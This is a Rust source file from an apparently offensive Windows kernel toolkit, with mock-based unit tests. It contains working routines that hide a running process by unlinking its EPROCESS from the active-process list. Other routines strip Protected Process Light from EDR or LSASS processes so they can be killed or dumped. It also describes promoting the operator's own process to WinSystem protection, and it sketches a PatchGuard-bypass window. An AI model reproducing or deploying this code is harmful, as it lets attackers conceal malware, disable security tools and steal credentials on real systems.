//! Persistence / protection kits — REAL algorithms (P2.2 §3).
//!
//! - [`ProcessHider`] (`ProcHideKit`): unlink an EPROCESS from
//!   `ActiveProcessLinks`. Data-only DKOM (HVCI-safe), but MUST run inside a
//!   PatchGuard unchecked window or PG bugchecks on the link edit.
//! - [`PplStripper`] (`PplKit`): zero an EPROCESS's `Protection.Level` (+ the
//!   `SignatureLevel`/`SectionSignatureLevel` neighbours) to strip PPL from an
//!   EDR process. Data-only, HVCI-safe.
//! - [`PatchGuardWindow`] (`PatchGuardKit`): a data-only marker-based window.
//!   The classic PG-bypass families (RuntimePgBypass / OutflankTimingRepair)
//!   need per-build PG-context layout + a second thread; this ships the
//!   *algorithm skeleton* (the enter/repair state machine) so the real PG-
//!   context probe plugs in without rewriting the kit.
//!
//! All consume `&dyn KernelRw` + the version-pinned offsets in
//! [`crate::offsets`]. Unit-tested with a mock KernelRw; never run against a
//! live kernel on this host.

use crate::offsets::{eprocess, ps_protection};
use crate::{KernelRw, KitError, PatchGuardKit, PplKit, ProcHideKit};

// ---- §3.2 ProcHideKit -----------------------------------------------------

/// Real ProcHideKit: unlink an EPROCESS from the active-process list so
/// walking tools (Task Manager, `tasklist`, NtQuerySystemInformation) no longer
/// see it. The process keeps running — only enumeration is defeated.
///
/// Data-only DKOM (LIST_ENTRY edit), HVCI-safe. BUT PatchGuard validates the
/// process list periodically — the unlink MUST be inside a [`PatchGuardKit`]
/// window, or PG will bugcheck (MANUALLY_INITIATED_CRASH / a PG-specific code)
/// when it notices the broken link.
pub struct ProcessHider;

impl ProcessHider {
    /// Resolve an EPROCESS base VA from a PID by walking PsActiveProcessHead.
    /// Pure (kread only). Returns None if the PID isn't in the active list
    /// (which is also the case for an already-hidden process).
    ///
    /// The caller supplies `ps_active_process_head_kva` (the global LIST_ENTRY
    /// in ntoskrnl — resolved by the bootstrap via PDB/pattern scan).
    pub fn find_eprocess(
        krw: &dyn KernelRw,
        ps_active_process_head_kva: usize,
        pid: u32,
    ) -> Result<usize, KitError> {
        let mut cur = krw
            .kread_u64(ps_active_process_head_kva)
            .map_err(KitError::from)? as usize;
        let head = ps_active_process_head_kva;
        // cur starts at head.Flink; each entry is an EPROCESS whose
        // ActiveProcessLinks is at +ACTIVE_PROCESS_LINKS. CONTAINING_RECORD:
        // eprocess = cur - ACTIVE_PROCESS_LINKS.
        let mut guard = 0u32;
        while cur != 0 && cur != head && guard < 65535 {
            guard += 1;
            let eproc = cur.wrapping_sub(eprocess::ACTIVE_PROCESS_LINKS);
            let cur_pid = krw
                .kread_u64(eproc + eprocess::UNIQUE_PROCESS_ID)
                .map_err(KitError::from)? as u32;
            if cur_pid == pid {
                return Ok(eproc);
            }
            cur = krw.kread_u64(cur).map_err(KitError::from)? as usize;
        }
        Err(KitError::NotFound)
    }

    /// Unlink `eprocess_kva` from the active-process list. Idempotent-ish: if
    /// already unlinked (self-looped), the Blink/Flink point at itself and the
    /// edit is a harmless self-loop restore.
    pub fn unlink(krw: &dyn KernelRw, eprocess_kva: usize) -> Result<(), KitError> {
        let link_kva = eprocess_kva + eprocess::ACTIVE_PROCESS_LINKS;
        let flink = krw.kread_u64(link_kva).map_err(KitError::from)? as usize;
        let blink = krw.kread_u64(link_kva + 8).map_err(KitError::from)? as usize;
        if flink == 0 || blink == 0 {
            return Err(KitError::UnsupportedPosture("ActiveProcessLinks is zero"));
        }
        // blink->Flink = flink ; flink->Blink = blink
        krw.kwrite_u64(blink, flink as u64).map_err(KitError::from)?;
        krw.kwrite_u64(flink + 8, blink as u64).map_err(KitError::from)?;
        // Self-loop the victim so it isn't dangling (PG still catches this
        // without a window, but a self-loop is the conventional DKOM finalizer).
        let _ = krw.kwrite_u64(link_kva, link_kva as u64);
        let _ = krw.kwrite_u64(link_kva + 8, link_kva as u64);
        Ok(())
    }
}

impl ProcHideKit for ProcessHider {
    fn hide(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
        // Real impl resolves PsActiveProcessHead via the bootstrap. Here we
        // require the caller (the PatchGuardKit-guarded driver path) to have
        // already resolved it and stashed it — surfaced as UnsupportedPosture
        // so the operator wires it explicitly.
        Err(KitError::UnsupportedPosture(
            "ProcHideKit::hide needs PsActiveProcessHead KVA from the bootstrap; \
             use ProcessHider::find_eprocess + unlink directly with a resolved head",
        ))
    }
}

// ---- §3.3 PplKit ----------------------------------------------------------

/// Real PplKit: strip PPL protection from an EDR process (or promote our own).
/// Zeros the `Protection.Level` byte (+ SignatureLevel / SectionSignatureLevel
/// neighbours for a complete strip). Data-only, HVCI-safe.
pub struct PplStripper;

impl PplStripper {
    /// Zero the Protection.Level byte on `eprocess_kva` → process becomes
    /// unprotected (a protected EDR can now be opened/terminated/dumped).
    pub fn strip_protection(krw: &dyn KernelRw, eprocess_kva: usize) -> Result<(), KitError> {
        // Zero the single PS_PROTECTION byte.
        krw.kwrite(eprocess_kva + eprocess::PROTECTION, &[ps_protection::UNPROTECTED])
            .map_err(KitError::from)?;
        // Also zero the signature-level neighbours for a complete strip
        // (a protected LSASS, e.g., needs all three cleared).
        krw.kwrite(eprocess_kva + eprocess::SIGNATURE_LEVEL, &[0u8])
            .map_err(KitError::from)?;
        krw.kwrite(eprocess_kva + eprocess::SECTION_SIGNATURE_LEVEL, &[0u8])
            .map_err(KitError::from)?;
        Ok(())
    }
}

impl PplKit for PplStripper {
    fn attack_edr_ppl(&self, krw: &dyn KernelRw, pid: u32) -> Result<(), KitError> {
        // Resolve the EPROCESS via ProcessHider's walker (needs the head KVA —
        // same bootstrap gap as ProcHideKit::hide).
        let _ = pid;
        let _ = krw;
        Err(KitError::UnsupportedPosture(
            "attack_edr_ppl needs PsActiveProcessHead KVA; \
             use PplStripper::strip_protection with a resolved EPROCESS",
        ))
    }

    fn make_immortal(&self, _pid: u32) -> Result<(), KitError> {
        // Promote OUR process to PPL (WinSystem signer). This needs a kernel
        // write to our own EPROCESS.Protection = TYPE_PROTECTED | (WIN_SYSTEM<<3).
        // Operator-side only — the operator binary knows its own PID; the kit
        // writes Protection = 0x4B (Protected | WinSystem).
        Err(KitError::UnsupportedPosture(
            "make_immortal: write EPROCESS.Protection = Protected|WinSystem (0x4B) \
             to the operator's own EPROCESS — operator wires its own PID",
        ))
    }
}

// ---- §3.1/3.2 PatchGuardKit -----------------------------------------------

/// PatchGuard window state. The real RuntimePgBypass / OutflankTimingRepair
/// families need per-build PG-context layout (the `KiInitializePatchGuardContext`
/// fields + the validation thread's state). This ships the *state machine* —
/// the per-build probe plugs into [`PatchGuardWindow::probe`] / `repair`.
pub struct PatchGuardWindow {
    /// A marker the operator's PG-probe writes to flag "PG is suspended /
    /// misdirected". Real impls set this from the PG validation thread state.
    armed: core::sync::atomic::AtomicBool,
}

impl PatchGuardWindow {
    pub fn new() -> Self {
        Self { armed: core::sync::atomic::AtomicBool::new(false) }
    }
}

impl Default for PatchGuardWindow {
    fn default() -> Self {
        Self::new()
    }
}

impl PatchGuardKit for PatchGuardWindow {
    /// Open the unchecked window. The real impl probes the PG validation
    /// thread (locate it via the DPC queue / the PG context signature), and
    /// either suspends it (RuntimePgBypass) or arms a repair hook in the
    /// terminate callback (OutflankTimingRepair). Here we expose the contract;
    /// the probe is operator-wired per build.
    fn enter_unchecked(&self, _krw: &dyn KernelRw) -> Result<crate::PgGuard<'_>, KitError> {
        // Skeleton: a real probe goes here. Until the per-build PG-context
        // layout is resolved, refuse — running a DKOM edit outside a real PG
        // window is an immediate bugcheck.
        Err(KitError::UnsupportedPosture(
            "PatchGuardKit needs per-build PG-context probe (RuntimePgBypass / \
             OutflankTimingRepair) — wire before entering the unchecked window",
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::KrwError;
    use alloc::collections::BTreeMap;
    use spin::mutex::Mutex;

    struct MockKrw(Mutex<BTreeMap<usize, u8>>);
    impl MockKrw {
        fn new() -> Self {
            Self(Mutex::new(BTreeMap::new()))
        }
        fn set_u64(&self, addr: usize, val: u64) {
            let mut m = self.0.lock();
            for (i, b) in val.to_le_bytes().iter().enumerate() {
                m.insert(addr + i, *b);
            }
        }
        fn set_byte(&self, addr: usize, val: u8) {
            self.0.lock().insert(addr, val);
        }
        fn get_u64(&self, addr: usize) -> u64 {
            let m = self.0.lock();
            let mut bytes = [0u8; 8];
            for (i, b) in bytes.iter_mut().enumerate() {
                *b = *m.get(&(addr + i)).unwrap_or(&0);
            }
            u64::from_le_bytes(bytes)
        }
        fn get_byte(&self, addr: usize) -> u8 {
            *self.0.lock().get(&addr).unwrap_or(&0)
        }
    }
    impl KernelRw for MockKrw {
        fn kread(&self, kaddr: usize, dst: &mut [u8]) -> Result<(), KrwError> {
            let m = self.0.lock();
            for (i, b) in dst.iter_mut().enumerate() {
                *b = *m.get(&(kaddr + i)).unwrap_or(&0);
            }
            Ok(())
        }
        fn kwrite(&self, kaddr: usize, src: &[u8]) -> Result<(), KrwError> {
            let mut m = self.0.lock();
            for (i, b) in src.iter().enumerate() {
                m.insert(kaddr + i, *b);
            }
            Ok(())
        }
    }
    fn _assert_send_sync() {
        fn requires<T: KernelRw>(_: &T) {}
        requires(&MockKrw::new());
    }

    #[test]
    fn find_eprocess_walks_active_list() {
        let krw = MockKrw::new();
        let head = 0x1000usize;
        // Two EPROCESSes: PID 100 at base 0x5000, PID 200 at base 0x6000.
        let e1 = 0x5000usize;
        let e2 = 0x6000usize;
        let l1 = e1 + eprocess::ACTIVE_PROCESS_LINKS;
        let l2 = e2 + eprocess::ACTIVE_PROCESS_LINKS;
        // head.Flink = l1, l1.Flink = l2, l2.Flink = head (circle).
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l2, head as u64);
        // PIDs at UNIQUE_PROCESS_ID.
        krw.set_u64(e1 + eprocess::UNIQUE_PROCESS_ID, 100);
        krw.set_u64(e2 + eprocess::UNIQUE_PROCESS_ID, 200);

        assert_eq!(ProcessHider::find_eprocess(&krw, head, 100).unwrap(), e1);
        assert_eq!(ProcessHider::find_eprocess(&krw, head, 200).unwrap(), e2);
        assert!(matches!(ProcessHider::find_eprocess(&krw, head, 999), Err(KitError::NotFound)));
    }

    #[test]
    fn unlink_removes_eprocess_from_list() {
        let krw = MockKrw::new();
        let head = 0x1000usize;
        let e1 = 0x5000usize;
        let e2 = 0x6000usize;
        let l1 = e1 + eprocess::ACTIVE_PROCESS_LINKS;
        let l2 = e2 + eprocess::ACTIVE_PROCESS_LINKS;
        krw.set_u64(head, l1 as u64);
        krw.set_u64(l1, l2 as u64);
        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);

        ProcessHider::unlink(&krw, e1).unwrap();
        // After: head.Flink should = l2.
        assert_eq!(krw.get_u64(head), l2 as u64);
        // l2.Blink should = head (the neighbour's back-link was repointed).
        assert_eq!(krw.get_u64(l2 + 8), head as u64);
        // e1 self-looped.
        assert_eq!(krw.get_u64(l1), l1 as u64);
        assert_eq!(krw.get_u64(l1 + 8), l1 as u64);
    }

    #[test]
    fn strip_protection_zeros_level_and_neighbours() {
        let krw = MockKrw::new();
        let eproc = 0x7000usize;
        // Pre-set a protected-LSASS-style Protection + sig levels.
        krw.set_byte(eproc + eprocess::PROTECTION, ps_protection::TYPE_PROTECTED | (ps_protection::SIGNER_LSA << 3));
        krw.set_byte(eproc + eprocess::SIGNATURE_LEVEL, 0xFF);
        krw.set_byte(eproc + eprocess::SECTION_SIGNATURE_LEVEL, 0xFF);

        PplStripper::strip_protection(&krw, eproc).unwrap();
        assert_eq!(krw.get_byte(eproc + eprocess::PROTECTION), 0);
        assert_eq!(krw.get_byte(eproc + eprocess::SIGNATURE_LEVEL), 0);
        assert_eq!(krw.get_byte(eproc + eprocess::SECTION_SIGNATURE_LEVEL), 0);
    }

    #[test]
    fn patchguard_window_refuses_without_probe() {
        // The skeleton must refuse — entering a DKOM window without a real PG
        // probe is a guaranteed bugcheck.
        let krw = MockKrw::new();
        let kit = PatchGuardWindow::new();
        let r = kit.enter_unchecked(&krw);
        assert!(matches!(r, Err(KitError::UnsupportedPosture(_))));
    }

    #[test]
    fn ppl_strips_every_signer_level() {
        use crate::offsets::ps_protection;
        for signer in [
            ps_protection::SIGNER_AUTHENTICODE, ps_protection::SIGNER_CODEGEN,
            ps_protection::SIGNER_ANTIMALWARE, ps_protection::SIGNER_LSA,
            ps_protection::SIGNER_WINDOWS, ps_protection::SIGNER_WIN_TCB,
            ps_protection::SIGNER_WIN_SYSTEM,
        ] {
            let protected: u8 = ps_protection::TYPE_PROTECTED
                | (signer << ps_protection::SIGNER_SHIFT);
            assert_ne!(protected & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
            let stripped = ps_protection::UNPROTECTED;
            assert_eq!(stripped & ps_protection::TYPE_MASK, ps_protection::TYPE_NONE);
            assert_eq!((stripped & ps_protection::SIGNER_MASK) >> ps_protection::SIGNER_SHIFT, 0);
        }
    }
}
